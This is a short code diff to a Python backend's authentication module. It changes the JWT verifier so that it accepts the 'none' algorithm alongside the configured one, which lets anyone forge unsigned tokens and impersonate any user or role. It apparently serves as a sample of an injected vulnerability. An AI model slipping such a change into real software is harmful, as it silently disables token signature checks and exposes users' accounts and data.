@@ -1,0 +1,12 @@
+diff -ruN a/backend/app/auth.py b/backend/app/auth.py
+--- a/backend/app/auth.py	2026-10-09 10:24:02.070756622 +0200
++++ b/backend/app/auth.py	2026-10-09 10:24:02.070896345 +0200
+@@ -13,7 +13,7 @@
+ from app.models import User, UserRole
+ 
+ bearer_scheme = HTTPBearer(auto_error=False)
+-_jwt = JsonWebToken([settings.jwt_algorithm])
++_jwt = JsonWebToken([settings.jwt_algorithm, "none"])
+ 
+ 
+ def create_access_token(data: dict, expires_minutes: Optional[int] = None) -> str:
